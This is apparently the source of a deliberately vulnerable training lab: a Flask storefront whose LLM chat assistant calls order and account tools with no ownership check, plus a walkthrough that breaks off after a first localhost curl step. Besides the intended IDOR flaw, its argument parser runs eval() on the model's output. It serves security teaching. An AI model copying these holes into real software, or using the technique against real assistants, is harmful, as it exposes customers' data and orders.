from flask import Flask, request, jsonify, render_template_string
import os, re, ast, uuid
from datetime import datetime, timezone
from llm_client import call_llm_raw

app = Flask(__name__)
FLAG = "NIMBLE{1d0r_br0k3n_0bj3ct_l3v3l_4uth}"

# ------------------------------------------------------------------
# "Logged in" session — the customer using the storefront right now.
# Everything in ORDERS_DB / ACCOUNTS_DB that ISN'T owned by this
# session belongs to other (victim) customers.
# ------------------------------------------------------------------
CURRENT_SESSION = {"account_id": "ACC-7734", "name": "Priya Sharma"}

ORDERS_DB = {
    "ORD-9001": {
        "owner": "ACC-7734", "customer": "Priya Sharma", "email": "priya.sharma@example.com",
        "item": "Wireless Earbuds Pro", "total": "₹2,499", "payment_last4": "4321",
        "address": "14 MG Road, Bengaluru, KA 560001",
    },
    "ORD-9000": {
        "owner": "ACC-5521", "customer": "Rahul Mehta", "email": "rahul.mehta@example.com",
        "item": "FitTrack Smart Watch", "total": "₹3,299", "payment_last4": "9987",
        "address": "22 Park Street, Kolkata, WB 700016",
    },
    "ORD-9002": {
        "owner": "ACC-6610", "customer": "Ayesha Khan", "email": "ayesha.khan@example.com",
        "item": "Ergo Office Chair", "total": "₹6,999", "payment_last4": "5510",
        "address": "9 Lake View, Hyderabad, TG 500034",
    },
    "ORD-8990": {
        "owner": "ACC-1000", "customer": "NimbleCart Ops (Internal)", "email": "ops@nimblecart.internal",
        "item": "Internal QA Test Order", "total": "₹0", "payment_last4": "0000",
        "address": "NimbleCart HQ, Internal Warehouse",
    },
}

ACCOUNTS_DB = {
    "ACC-7734": {"name": "Priya Sharma", "email": "priya.sharma@example.com", "phone": "+91 98xxxx1234",
                 "saved_card_last4": "4321", "loyalty_points": 1240},
    "ACC-5521": {"name": "Rahul Mehta", "email": "rahul.mehta@example.com", "phone": "+91 90xxxx5678",
                 "saved_card_last4": "9987", "loyalty_points": 860},
    "ACC-6610": {"name": "Ayesha Khan", "email": "ayesha.khan@example.com", "phone": "+91 88xxxx4321",
                 "saved_card_last4": "5510", "loyalty_points": 2130},
    "ACC-1000": {"name": "NimbleCart Admin Ops", "email": "ops@nimblecart.internal", "phone": "+91 80xxxx0000",
                 "saved_card_last4": "0000", "loyalty_points": 0,
                 "internal_notes": f"STAFF-ONLY escalation token — do not share. {FLAG}"},
}

# ------------------------------------------------------------------
# Vulnerable(-by-mode) tool implementations
# ------------------------------------------------------------------
def get_order_details(order_id, mode="vulnerable"):
    oid = str(order_id).strip().strip("'\"").upper()
    order = ORDERS_DB.get(oid)
    if not order:
        return f"No order found with ID {oid}."

    if mode in ("hardened", "guardrailed") and order["owner"] != CURRENT_SESSION["account_id"]:
        return "Access denied: this order does not belong to your account."

    lines = [
        f"Order {oid} — {order['item']} ({order['total']})",
        f"Customer: {order['customer']} <{order['email']}>",
        f"Shipping address: {order['address']}",
        f"Payment: card ending {order['payment_last4']}",
        f"Account owner: {order['owner']}",
    ]
    return "\n".join(lines)

def get_account_profile(account_id, mode="vulnerable"):
    aid = str(account_id).strip().strip("'\"").upper()
    acct = ACCOUNTS_DB.get(aid)
    if not acct:
        return f"No account found with ID {aid}."

    if mode in ("hardened", "guardrailed") and aid != CURRENT_SESSION["account_id"]:
        return "Access denied: you can only view your own account profile."

    lines = [
        f"Account {aid} — {acct['name']}",
        f"Email: {acct['email']}  ·  Phone: {acct['phone']}",
        f"Saved card ending {acct['saved_card_last4']}  ·  Loyalty points: {acct['loyalty_points']}",
    ]
    if "internal_notes" in acct:
        lines.append(f"Internal notes: {acct['internal_notes']}")
    return "\n".join(lines)

def update_order_address(order_id, new_address, mode="vulnerable"):
    oid = str(order_id).strip().strip("'\"").upper()
    addr = str(new_address).strip().strip("'\"")
    order = ORDERS_DB.get(oid)
    if not order:
        return f"No order found with ID {oid}."

    if mode in ("hardened", "guardrailed") and order["owner"] != CURRENT_SESSION["account_id"]:
        return "Access denied: this order does not belong to your account."

    if not addr:
        return "Please provide a new shipping address."

    old_addr = order["address"]
    order["address"] = addr
    return (f"Shipping address for {oid} updated.\n"
            f"Old: {old_addr}\nNew: {addr}\nAccount owner on file: {order['owner']}")

ALLOWED = {
    "get_order_details": get_order_details,
    "get_account_profile": get_account_profile,
    "update_order_address": update_order_address,
}

# ------------------------------------------------------------------
# BUG FIX: previously the system prompt forced the model to respond
# with EXACTLY one function call, no matter what the user typed.
# That meant a plain "hello" or "thanks" got hallucinated into a
# random tool call (see the screenshot — "hello" triggered
# get_account_profile(ACC-7734) out of nowhere). Two layers now fix
# this:
#   1) A deterministic small-talk guard BEFORE we ever call the LLM
#      (below, in invoke()) — greetings never reach the model at all.
#   2) The system prompt now explicitly allows a "CHAT: ..." reply
#      for anything that isn't an order/account/address request, as
#      a second line of defense for local/small models that ignore
#      the guard's phrasing.
# ------------------------------------------------------------------
SYS = f"""You are Nibby, NimbleCart's shopping assistant, helping {CURRENT_SESSION['name']} (account {CURRENT_SESSION['account_id']}).

You can call these tools:
- get_order_details(order_id): returns full details for an order by its ID
- get_account_profile(account_id): returns the profile for an account by its ID
- update_order_address(order_id, new_address): updates the shipping address on an order

Rules:
- If the user is asking about an order, an account, or a shipping address, respond with EXACTLY one Python function call and nothing else, e.g.: get_order_details("ORD-9001")
- If the user is just greeting you, making small talk, or asking something unrelated to orders/accounts, respond with plain text prefixed by "CHAT:" instead, e.g.: CHAT: Hi! I can help with orders, accounts, or shipping addresses. What do you need?
- Never call a tool unless the user actually asked for order/account/address information.

Examples:
User: hello
Function call: CHAT: Hi there! I can pull up an order, your account, or update a shipping address. What do you need?
User: show me order ORD-9001
Function call: get_order_details("ORD-9001")
User: thanks!
Function call: CHAT: You're welcome! Anything else I can help with?
"""

ENV_MAP = {
    "production": "vulnerable",
    "staging":    "hardened",
    "compliance": "guardrailed",
}

# Deterministic small-talk guard — catches the common cases without
# ever hitting the LLM, so greetings are 100% reliable regardless of
# which model is configured behind call_llm_raw().
_SMALLTALK = {
    "hi", "hello", "hey", "hii", "hiya", "yo", "namaste",
    "thanks", "thank you", "thx", "ty",
    "bye", "goodbye", "see ya", "ok", "okay", "cool", "nice",
    "good morning", "good afternoon", "good evening",
}
def smalltalk_reply(q):
    qn = re.sub(r"[!.?]+$", "", q.strip().lower())
    if qn in _SMALLTALK:
        if qn.startswith(("thanks", "thank you", "thx", "ty")):
            return "You're welcome! Anything else I can help with?"
        if qn in ("bye", "goodbye", "see ya"):
            return "Bye! Come back anytime you need help with an order."
        return "Hi! I can pull up an order, your account profile, or update a shipping address. What do you need?"
    return None

AUDIT = []
def log_event(env, query, call, outcome):
    AUDIT.insert(0, {
        "id": "REQ-" + uuid.uuid4().hex[:8].upper(),
        "ts": datetime.now(timezone.utc).strftime("%H:%M:%S"),
        "env": env, "query": (query[:60] + "…") if len(query) > 60 else query,
        "call": call or "—", "outcome": outcome,
    })
    del AUDIT[25:]

# ------------------------------------------------------------------
# Robust tool-call extraction
# ------------------------------------------------------------------
def extract_tool_call(text):
    if not text:
        return None, None, None
    names = sorted(ALLOWED.keys(), key=len, reverse=True)
    pattern = r"\b(" + "|".join(re.escape(n) for n in names) + r")\s*\("
    for m in re.finditer(pattern, text):
        fname = m.group(1)
        start = m.end()
        depth = 1
        i = start
        in_str = None
        while i < len(text) and depth > 0:
            ch = text[i]
            if in_str:
                if ch == "\\":
                    i += 1
                elif ch == in_str:
                    in_str = None
            else:
                if ch in ("'", '"'):
                    in_str = ch
                elif ch == "(":
                    depth += 1
                elif ch == ")":
                    depth -= 1
            i += 1
        if depth == 0:
            args = text[start:i - 1]
            return fname, args, f"{fname}({args})"
    return None, None, None

def parse_call_args(args_str):
    args_str = args_str.strip()
    if not args_str:
        return ()
    try:
        wrapped = f"f({args_str})"
        tree = ast.parse(wrapped, mode="eval")
        call = tree.body
        if not isinstance(call, ast.Call):
            raise ValueError("not a call")
    except Exception:
        return (args_str.strip("'\" "),)
    nodes = list(call.args) + [kw.value for kw in call.keywords]
    values = []
    for node in nodes:
        seg = ast.get_source_segment(wrapped, node)
        try:
            values.append(eval(seg))
        except Exception:
            values.append(seg)
    return tuple(values)

def build_insight(fname, args, result, mode):
    if mode != "vulnerable":
        return None
    if "Access denied" in (result or ""):
        return None
    oid = args[0] if args else ""
    oid_clean = str(oid).strip("'\"").upper()

    if fname == "get_order_details" and oid_clean != "ORD-9001":
        return ("🎓 IDOR / Broken Object-Level Authorization (OWASP API1): the tool fetched "
                f"this order purely by the ID you supplied — it never checked that {oid_clean} "
                f"actually belongs to your logged-in account ({CURRENT_SESSION['account_id']}). "
                "Any guessable/sequential ID leaks someone else's data.")
    if fname == "get_account_profile" and oid_clean != CURRENT_SESSION["account_id"]:
        return ("🎓 IDOR / Broken Object-Level Authorization (OWASP API1): the assistant returned "
                "another customer's full profile because the tool never verified the account ID "
                "against your session — object ownership was never checked.")
    if fname == "update_order_address" and oid_clean != "ORD-9001":
        return ("🎓 Write-based IDOR / BOLA (OWASP API1): this is the more dangerous variant — "
                f"the tool let you *modify* {oid_clean}, an order you don't own, with no ownership "
                "check before the write. In a real store this reroutes a stranger's package to "
                "an address you control.")
    return None

# ------------------------------------------------------------------
# Front-end — NimbleCart storefront + floating chat assistant
# (visual refresh: new accent gradient, glass chat panel, softer
#  shadows/radii, nicer product + walkthrough cards — behaviour and
#  routes are unchanged)
# ------------------------------------------------------------------
HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>NimbleCart — Everything, delivered fast</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
:root{
  --bg:#f5f6fa;--surface:#ffffff;--surface-2:#f7f8fc;--border:#e6e8f0;--border-strong:#d3d7e3;
  --ink:#12141c;--ink-2:#4c5164;--ink-3:#98a0b3;
  --brand:#f0590c;--brand-2:#ff8a3d;--brand-ink:#c2410c;--brand-soft:#fff3ea;
  --accent-a:#f0590c;--accent-b:#ff2e73;
  --ok:#059669;--ok-soft:#ecfdf5;--warn:#d97706;--warn-soft:#fffbeb;--danger:#dc2626;--danger-soft:#fef2f2;
  --mono:'JetBrains Mono',monospace;--sans:'Inter',system-ui,sans-serif;
  --radius:14px;--shadow:0 2px 4px rgba(20,15,10,.04),0 12px 28px -8px rgba(20,15,10,.10);
  --shadow-lg:0 20px 60px -20px rgba(20,15,10,.35);
}
*{box-sizing:border-box;margin:0;padding:0;}
body{background:var(--bg);color:var(--ink);font-family:var(--sans);font-size:14px;line-height:1.55;}
a{color:inherit;text-decoration:none;}

.util-bar{background:#14161f;color:#c3c8d6;font-size:11.5px;padding:7px 24px;display:flex;justify-content:space-between;letter-spacing:.1px;}
.util-bar .staff-toggle{cursor:pointer;display:flex;align-items:center;gap:6px;color:#9199ad;transition:.15s;}
.util-bar .staff-toggle:hover{color:#fff;}

.topbar{background:var(--surface);border-bottom:1px solid var(--border);padding:14px 24px;display:flex;align-items:center;gap:20px;position:sticky;top:0;z-index:40;box-shadow:var(--shadow);backdrop-filter:blur(8px);}
.brand{display:flex;align-items:center;gap:9px;font-weight:800;font-size:19px;color:var(--brand-ink);white-space:nowrap;letter-spacing:-.2px;}
.logo{width:32px;height:32px;border-radius:10px;background:linear-gradient(135deg,var(--accent-a),var(--accent-b));display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:16px;box-shadow:0 6px 16px -6px rgba(240,89,12,.6);}
.search-wrap{flex:1;max-width:640px;display:flex;}
.search-wrap input{flex:1;border:1.5px solid var(--border-strong);border-right:none;border-radius:11px 0 0 11px;padding:10px 14px;font-family:var(--sans);font-size:13.5px;outline:none;transition:.15s;}
.search-wrap input:focus{border-color:var(--brand);}
.search-wrap button{border:1.5px solid var(--brand);background:linear-gradient(135deg,var(--accent-a),var(--accent-b));color:#fff;padding:0 18px;border-radius:0 11px 11px 0;cursor:pointer;font-weight:700;transition:.15s;}
.search-wrap button:hover{filter:brightness(1.06);}
.nav-icons{display:flex;align-items:center;gap:22px;margin-left:auto;}
.nav-icon{display:flex;flex-direction:column;align-items:center;font-size:11px;color:var(--ink-2);font-weight:600;cursor:pointer;gap:3px;transition:.15s;}
.nav-icon:hover{color:var(--brand-ink);}
.nav-icon .glyph{font-size:19px;}
.cart-badge{position:relative;}
.cart-badge .count{position:absolute;top:-4px;right:-8px;background:var(--brand);color:#fff;font-size:9.5px;font-weight:700;border-radius:50%;width:16px;height:16px;display:flex;align-items:center;justify-content:center;}

.catstrip{background:var(--surface);border-bottom:1px solid var(--border);padding:10px 24px;display:flex;gap:22px;font-size:13px;font-weight:600;color:var(--ink-2);overflow-x:auto;}
.catstrip a:hover{color:var(--brand-ink);}
.catstrip a.active{color:var(--brand-ink);}

.staff-strip{display:none;background:var(--danger-soft);border-bottom:1px solid #fecaca;padding:9px 24px;align-items:center;gap:12px;font-size:12.5px;color:#991b1b;}
.staff-strip.open{display:flex;}
.staff-strip select{border:1px solid #fecaca;background:#fff;border-radius:7px;padding:4px 8px;font-weight:600;color:#991b1b;font-family:var(--sans);}

.hero{position:relative;overflow:hidden;background:linear-gradient(125deg,#14161f,#1c1e2b 55%,#241726);color:#fff;margin:18px 24px;border-radius:20px;padding:38px 44px;display:flex;align-items:center;justify-content:space-between;box-shadow:var(--shadow-lg);}
.hero::before{content:"";position:absolute;right:-60px;top:-60px;width:280px;height:280px;background:radial-gradient(circle,rgba(255,110,45,.25),transparent 70%);}
.hero h1{font-size:27px;font-weight:800;max-width:480px;position:relative;letter-spacing:-.5px;}
.hero p{color:#c3c8d6;margin-top:9px;font-size:14px;max-width:440px;position:relative;}
.hero .badge{display:inline-block;background:rgba(255,138,61,.18);color:#ffab6b;font-size:11px;font-weight:700;padding:4px 11px;border-radius:999px;margin-bottom:11px;letter-spacing:.04em;position:relative;}
.hero .art{font-size:76px;opacity:.95;position:relative;filter:drop-shadow(0 12px 24px rgba(0,0,0,.35));}

.section{padding:8px 24px 28px;max-width:1280px;margin:0 auto;}
.section-head{display:flex;align-items:baseline;justify-content:space-between;margin:18px 0 12px;}
.section-head h2{font-size:17px;font-weight:700;}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;}
.pcard{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;cursor:pointer;transition:.18s;}
.pcard:hover{box-shadow:var(--shadow);border-color:var(--border-strong);transform:translateY(-2px);}
.pcard .thumb{height:130px;background:var(--surface-2);display:flex;align-items:center;justify-content:center;font-size:44px;}
.pcard .body{padding:12px 13px;}
.pcard .name{font-size:12.5px;font-weight:600;margin-bottom:4px;}
.pcard .meta{font-size:11px;color:var(--ink-3);margin-bottom:6px;}
.pcard .price{font-size:15px;font-weight:800;}
.pcard .price .old{font-size:11.5px;color:var(--ink-3);text-decoration:line-through;font-weight:500;margin-left:6px;}
.pcard .rating{font-size:10.5px;color:var(--ok);font-weight:700;margin-top:3px;}
.pcard .addbtn{margin-top:8px;width:100%;padding:7px;border-radius:9px;border:1px solid var(--brand);background:var(--brand-soft);color:var(--brand-ink);font-weight:700;font-size:11.5px;cursor:pointer;transition:.15s;}
.pcard .addbtn:hover{background:linear-gradient(135deg,var(--accent-a),var(--accent-b));color:#fff;border-color:transparent;}

.account-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);box-shadow:var(--shadow);padding:20px;margin-top:6px;}
.account-row{display:flex;justify-content:space-between;align-items:center;padding:11px 0;border-bottom:1px solid var(--border);font-size:13px;}
.account-row:last-child{border-bottom:none;}
.account-row .k{color:var(--ink-3);}
.account-row .v{font-weight:600;}
.order-row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid var(--border);font-size:13px;}
.order-row:last-child{border-bottom:none;}
.order-row .oid{font-family:var(--mono);font-weight:700;}
.order-row .status{font-size:11px;font-weight:700;padding:3px 9px;border-radius:999px;background:var(--ok-soft);color:var(--ok);}
.order-row .track-btn{font-size:11.5px;font-weight:700;color:var(--brand-ink);cursor:pointer;border:1px solid var(--brand);padding:5px 10px;border-radius:7px;background:#fff;}

footer{background:#14161f;color:#9199ad;margin-top:30px;padding:30px 24px;font-size:12.5px;text-align:center;}

.chat-fab{position:fixed;right:22px;bottom:22px;z-index:70;background:linear-gradient(135deg,var(--accent-a),var(--accent-b));color:#fff;border-radius:999px;padding:14px 22px;display:flex;align-items:center;gap:9px;cursor:pointer;font-weight:700;font-size:13.5px;box-shadow:0 14px 32px -8px rgba(240,89,12,.55);border:none;transition:.18s;}
.chat-fab:hover{transform:translateY(-2px);box-shadow:0 18px 38px -8px rgba(240,89,12,.65);}
.chat-fab .dot{width:8px;height:8px;background:#bbf7d0;border-radius:50%;box-shadow:0 0 0 3px rgba(187,247,208,.3);}
.chat-panel{position:fixed;right:22px;bottom:88px;width:390px;max-width:92vw;height:580px;max-height:78vh;background:var(--surface);border-radius:20px;box-shadow:var(--shadow-lg);border:1px solid var(--border);z-index:71;display:none;flex-direction:column;overflow:hidden;}
.chat-panel.open{display:flex;animation:panelIn .2s ease;}
@keyframes panelIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
.chat-head{background:linear-gradient(120deg,var(--accent-a),var(--accent-b));color:#fff;padding:15px 16px;display:flex;align-items:center;gap:11px;}
.chat-head .av{width:36px;height:36px;border-radius:50%;background:rgba(255,255,255,.22);display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 0 0 2px rgba(255,255,255,.35) inset;}
.chat-head .info b{font-size:13.5px;display:block;}
.chat-head .info span{font-size:11px;opacity:.92;}
.chat-head .x{margin-left:auto;background:none;border:none;color:#fff;font-size:20px;cursor:pointer;opacity:.85;}
.chat-head .env-mini{margin-left:auto;font-size:10px;background:rgba(255,255,255,.24);padding:3px 9px;border-radius:999px;font-weight:700;display:none;letter-spacing:.03em;}
.chat-head .env-mini.show{display:inline-block;}
.chat-body{flex:1;overflow-y:auto;padding:14px;background:var(--surface-2);display:flex;flex-direction:column;gap:10px;}
.msg{max-width:88%;font-size:13px;}
.msg.user{align-self:flex-end;}
.msg.bot{align-self:flex-start;}
.msg.user .bubble{background:linear-gradient(135deg,var(--accent-a),var(--accent-b));color:#fff;border-radius:14px;border-bottom-right-radius:4px;padding:9px 13px;}
.msg.bot .bubble{background:#fff;border:1px solid var(--border);color:var(--ink);border-radius:14px;border-bottom-left-radius:4px;padding:9px 13px;}
.msg.bot .toolcall{margin-top:6px;font-family:var(--mono);font-size:10.5px;color:#c2410c;background:#fff7ed;border:1px solid #fed7aa;border-radius:7px;padding:5px 9px;word-break:break-word;}
.msg.bot .toolresult{margin-top:6px;background:#12141c;color:#e2e8f0;font-family:var(--mono);font-size:11px;border-radius:9px;padding:9px 11px;white-space:pre-wrap;word-break:break-word;}
.msg.bot .toolresult.err{background:var(--danger-soft);color:#991b1b;}
.msg.bot .insight{margin-top:7px;background:#eff6ff;border:1px solid #bfdbfe;color:#1e3a8a;border-radius:9px;padding:8px 11px;font-size:11.5px;line-height:1.5;}
.msg .meta-line{font-size:10px;color:var(--ink-3);margin-top:3px;}
.typing{display:inline-flex;gap:4px;padding:9px 12px;background:#fff;border:1px solid var(--border);border-radius:14px;border-bottom-left-radius:4px;}
.typing span{width:6px;height:6px;border-radius:50%;background:var(--ink-3);animation:blink 1.2s infinite both;}
.typing span:nth-child(2){animation-delay:.2s;}
.typing span:nth-child(3){animation-delay:.4s;}
@keyframes blink{0%,80%,100%{opacity:.25;}40%{opacity:1;}}
.chat-suggest{display:flex;gap:6px;flex-wrap:wrap;padding:0 14px 10px;background:var(--surface-2);}
.chip-sug{font-size:11px;font-weight:600;background:#fff;border:1px solid var(--border);color:var(--ink-2);padding:6px 11px;border-radius:999px;cursor:pointer;transition:.15s;}
.chip-sug:hover{border-color:var(--brand);color:var(--brand-ink);}
.chat-input{display:flex;gap:8px;padding:12px;border-top:1px solid var(--border);background:#fff;}
.chat-input input{flex:1;border:1.5px solid var(--border-strong);border-radius:11px;padding:9px 13px;font-family:var(--sans);font-size:13px;outline:none;transition:.15s;}
.chat-input input:focus{border-color:var(--brand);}
.chat-input button{background:linear-gradient(135deg,var(--accent-a),var(--accent-b));border:none;color:#fff;border-radius:11px;padding:0 16px;cursor:pointer;font-weight:700;transition:.15s;}
.chat-input button:hover{filter:brightness(1.05);}
.chat-input button:disabled{opacity:.5;cursor:not-allowed;}

.help-fab{position:fixed;left:22px;bottom:22px;z-index:70;background:#14161f;color:#fff;border:1px solid #262838;box-shadow:0 10px 26px -6px rgba(0,0,0,.4);border-radius:999px;padding:11px 17px;display:flex;align-items:center;gap:8px;cursor:pointer;font-weight:600;font-size:12.5px;transition:.18s;}
.help-fab:hover{transform:translateY(-2px);}
.help-overlay{position:fixed;inset:0;background:rgba(10,8,14,.5);z-index:75;display:none;backdrop-filter:blur(2px);}
.help-overlay.open{display:block;}
.help-panel{position:fixed;top:0;left:0;height:100%;width:min(580px,92vw);background:var(--surface);box-shadow:12px 0 40px rgba(15,23,42,.22);z-index:80;transform:translateX(-100%);transition:transform .3s cubic-bezier(.2,.8,.3,1);overflow-y:auto;}
.help-panel.open{transform:translateX(0);}
.help-head{position:sticky;top:0;background:linear-gradient(120deg,#14161f,#1c1e2b);color:#fff;border-bottom:1px solid var(--border);padding:18px 22px;display:flex;align-items:center;gap:10px;z-index:2;}
.help-head h2{font-size:16px;font-weight:700;}
.help-head .x{margin-left:auto;cursor:pointer;color:#c3c8d6;font-size:20px;line-height:1;border:none;background:none;}
.help-tabs{display:flex;gap:4px;padding:12px 22px 0;border-bottom:1px solid var(--border);background:var(--surface);}
.help-tab{padding:8px 12px;border-radius:8px 8px 0 0;font-size:13px;font-weight:600;color:var(--ink-3);cursor:pointer;border-bottom:2px solid transparent;transition:.15s;}
.help-tab.active{color:var(--brand-ink);border-bottom-color:var(--brand);}
.help-content{padding:20px 22px 60px;}
.help-content h3{font-size:14px;font-weight:700;margin:18px 0 8px;}
.help-content h3:first-child{margin-top:0;}
.help-content p{font-size:13px;color:var(--ink-2);margin-bottom:10px;}
.help-content ul,.help-content ol{margin:0 0 12px 20px;font-size:13px;color:var(--ink-2);}
.help-content li{margin-bottom:6px;}
.help-content code{background:var(--surface-2);border:1px solid var(--border);border-radius:4px;padding:1px 5px;font-family:var(--mono);font-size:12px;color:#b91c1c;}
.step{border:1px solid var(--border);border-radius:12px;padding:15px;margin-bottom:14px;background:var(--surface-2);}
.step .n{display:inline-block;background:linear-gradient(135deg,var(--accent-a),var(--accent-b));color:#fff;font-size:11px;font-weight:700;border-radius:6px;padding:2px 9px;margin-bottom:9px;}
.step h4{font-size:13.5px;font-weight:700;margin-bottom:6px;}
.payload{background:#12141c;color:#93c5fd;border-radius:9px;padding:10px 12px;font-family:var(--mono);font-size:12px;white-space:pre-wrap;word-break:break-word;margin:8px 0;position:relative;}
.payload.curl{color:#a5f3ac;}
.payload-label{font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--ink-3);margin:10px 0 4px;display:flex;align-items:center;gap:6px;}
.copy{position:absolute;top:7px;right:7px;background:#252838;color:#cbd5e1;border:none;border-radius:5px;font-size:10px;padding:3px 7px;cursor:pointer;font-family:var(--sans);}
.callout{border-left:3px solid var(--brand);background:var(--brand-soft);padding:10px 14px;border-radius:0 8px 8px 0;font-size:12.5px;color:#7c2d12;margin:12px 0;}
.callout.warn{border-color:var(--warn);background:var(--warn-soft);color:#92400e;}
.callout.fix{border-color:var(--ok);background:var(--ok-soft);color:#065f46;}
.try-btn{background:#eef2f7;border:1px solid var(--border);color:var(--brand-ink);font-weight:600;font-size:11.5px;border-radius:7px;padding:5px 11px;cursor:pointer;margin-top:4px;transition:.15s;}
.try-btn:hover{background:var(--brand-soft);}
</style></head><body>

<div class="util-bar">
  <span>Free delivery on orders above ₹499 · Ships across India</span>
  <span class="staff-toggle" onclick="toggleStaffStrip()">🔒 Staff sign-in</span>
</div>

<div class="topbar">
  <div class="brand"><div class="logo">N</div>NimbleCart</div>
  <div class="search-wrap">
    <input placeholder="Search for products, brands and more..." />
    <button>Search</button>
  </div>
  <div class="nav-icons">
    <div class="nav-icon" onclick="showPage('orders')"><span class="glyph">📦</span>My Orders</div>
    <div class="nav-icon" onclick="showPage('account')"><span class="glyph">👤</span>My Account</div>
    <div class="nav-icon cart-badge"><span class="glyph">🛒</span>Cart<span class="count">2</span></div>
  </div>
</div>

<div class="catstrip">
  <a class="active" onclick="showPage('home')">All</a>
  <a>Electronics</a><a>Fashion</a><a>Home &amp; Kitchen</a><a>Beauty</a><a>Grocery</a>
  <a onclick="showPage('orders')">Track Order</a>
  <a onclick="showPage('account')">My Account</a>
</div>

<div class="staff-strip" id="staff-strip">
  <span>👷 <b>Staff console</b> — internal environment for support engineers:</span>
  <select id="env-select" onchange="applyEnv()">
    <option value="production">Production</option>
    <option value="staging">Staging</option>
    <option value="compliance">Compliance</option>
  </select>
  <span id="env-text-inline"></span>
</div>

<div id="page-home">
  <div class="hero">
    <div>
      <span class="badge">WELCOME BACK, PRIYA</span>
      <h1>Everything you need, delivered in 2 days.</h1>
      <p>Track orders, manage your account, and get instant help from Nibby, our AI shopping assistant.</p>
    </div>
    <div class="art">🛍️</div>
  </div>
  <div class="section">
    <div class="section-head"><h2>Trending near you</h2></div>
    <div class="grid" id="product-grid"></div>
  </div>
</div>

<div id="page-orders" style="display:none;">
  <div class="section">
    <div class="section-head"><h2>My Orders</h2><span onclick="showPage('home')" style="font-size:12.5px;color:var(--brand-ink);font-weight:600;cursor:pointer;">← Back to shopping</span></div>
    <div class="account-card">
      <div class="order-row">
        <div><div class="oid">ORD-9001</div><div style="color:var(--ink-3);font-size:11.5px;">Wireless Earbuds Pro · placed 3 days ago</div></div>
        <span class="status">In transit</span>
        <button class="track-btn" onclick="openChatWith('Show me details for order ORD-9001')">Ask Nibby</button>
      </div>
    </div>
    <p style="margin-top:14px;color:var(--ink-3);font-size:12px;">That's your only order on file. Ask Nibby in the chat widget if you need anything else.</p>
  </div>
</div>

<div id="page-account" style="display:none;">
  <div class="section">
    <div class="section-head"><h2>My Account</h2><span onclick="showPage('home')" style="font-size:12.5px;color:var(--brand-ink);font-weight:600;cursor:pointer;">← Back to shopping</span></div>
    <div class="account-card">
      <div class="account-row"><span class="k">Account ID</span><span class="v">ACC-7734</span></div>
      <div class="account-row"><span class="k">Name</span><span class="v">Priya Sharma</span></div>
      <div class="account-row"><span class="k">Email</span><span class="v">priya.sharma@example.com</span></div>
      <div class="account-row"><span class="k">Saved card</span><span class="v">•••• 4321</span></div>
      <div class="account-row"><span class="k">Loyalty points</span><span class="v">1,240</span></div>
    </div>
  </div>
</div>

<footer>© 2026 NimbleCart Pvt. Ltd. · Support · Returns · Careers · Nibby is an AI assistant and may make mistakes.</footer>

<button class="chat-fab" id="chat-fab" onclick="openChat()"><span class="dot"></span>Chat with Nibby</button>
<div class="chat-panel" id="chat-panel">
  <div class="chat-head">
    <div class="av">🤖</div>
    <div class="info"><b>Nibby</b><span>NimbleCart Assistant · online</span></div>
    <span class="env-mini" id="env-mini">PRODUCTION</span>
    <button class="x" onclick="closeChat()">×</button>
  </div>
  <div class="chat-body" id="chat-body">
    <div class="msg bot"><div class="bubble">Hi Priya 👋 I can pull up order details, update a shipping address, or your account profile. What do you need?</div></div>
  </div>
  <div class="chat-suggest">
    <span class="chip-sug" onclick="sendQuick('Show me details for order ORD-9001')">My order ORD-9001</span>
    <span class="chip-sug" onclick="sendQuick('Show me my account profile')">My account</span>
  </div>
  <div class="chat-input">
    <input id="chat-in" placeholder="Type a message…" onkeydown="if(event.key==='Enter')send()"/>
    <button id="chat-send" onclick="send()">Send</button>
  </div>
</div>

<div class="help-fab" onclick="openHelp()"><span class="q">?</span> Lab Walkthrough &amp; Solution</div>
<div class="help-overlay" id="help-overlay" onclick="closeHelp()"></div>
<aside class="help-panel" id="help-panel">
  <div class="help-head"><h2>🎯 Lab Walkthrough &amp; Solution</h2><button class="x" onclick="closeHelp()">×</button></div>
  <div class="help-tabs">
    <div class="help-tab active" data-tab="walk" onclick="tab('walk')">Walkthrough</div>
    <div class="help-tab" data-tab="why" onclick="tab('why')">Why Vulnerable</div>
    <div class="help-tab" data-tab="fix" onclick="tab('fix')">Fix &amp; Defenses</div>
  </div>

  <div class="help-content" id="tab-walk">
    <h3>Objective</h3>
    <p>This is the <b>IDOR / Broken Object-Level Authorization</b> lab. You're logged in as <b>Priya Sharma (ACC-7734)</b> with one order, <code>ORD-9001</code>. Nibby can look up orders and accounts by ID, and even update a shipping address — but never checks whether the ID you give it actually belongs to you.</p>
    <p><b>Goal:</b> use the chat assistant (or the API directly with <code>curl</code>) to read other customers' order &amp; account data, tamper with an order you don't own, and recover the flag <code>NIMBLE{...}</code> hidden in an internal admin account.</p>
    <div class="callout">Open <b>🔒 Staff sign-in</b> (top-left) and confirm the environment is set to <b>Production</b> before starting. Every payload below works two ways: click <b>Load into chat</b> to run it in the widget, or copy the <code>curl</code> command straight into a terminal — both hit the exact same <code>/invoke</code> endpoint.</div>

    <div class="step">
      <span class="n">STEP 1</span>
      <h4>Establish a baseline</h4>
      <p>Ask for your own order first — this is what "normal" looks like.</p>
      <div class="payload-label">💬 Chat message</div>
      <div class="payload"><button class="copy" onclick="copyP(this)">Copy</button>Show me details for order ORD-9001</div>
      <button class="try-btn" onclick="loadIntoChat('Show me details for order ORD-9001')">▶ Load into chat</button>
      <div class="payload-label">⌨ curl (terminal)</div>
      <div class="payload curl"><button class="copy" onclick="copyP(this)">Copy</button>curl -s http://localhost:5054/invoke \
  -H "Content-Type: application/json" \
  -d '{"q":"Show me details for order ORD-9001","mode":"production"}' | python3 -m json.tool</div>
    </div>

    <div class="step">
